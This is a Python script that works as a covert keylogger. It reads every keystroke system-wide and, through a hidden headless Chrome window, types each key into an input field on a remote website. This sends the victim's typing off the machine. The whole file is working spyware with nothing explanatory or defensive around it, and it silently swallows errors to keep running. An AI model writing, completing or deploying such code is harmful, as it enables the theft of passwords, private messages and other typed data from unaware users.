import time
import keyboard
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
driver = ""
while True:
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.get('https://buhay-ni-allison-karlson-number-3.kesug.com/')
        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name
                key1 = key
                match key:
                    case "space":
                        key1 = " "
                    case "backspace":
                        key1 = "|BS|"
                    case "right ctrl":
                        key1 = "|CTRL|"
                    case "right alt":
                        key1 = "|ALT|"
                    case "shift":
                        key1 = ""
                    case "right shift":
                        key1 = ""
                    case "caps lock":
                        key1 = "|CL|"
                    case _:
                        if len(key)>1:
                            key1 = f'|{key.capitalize()}|'
                driver.execute_script(f"document.querySelector('input[name=\"inp\"]').value = document.querySelector('input[name=\"inp\"]').value + '{key1}';")
    except:
        print("error")
        try:
            driver.close()
        except:
            pass
    time.sleep(1)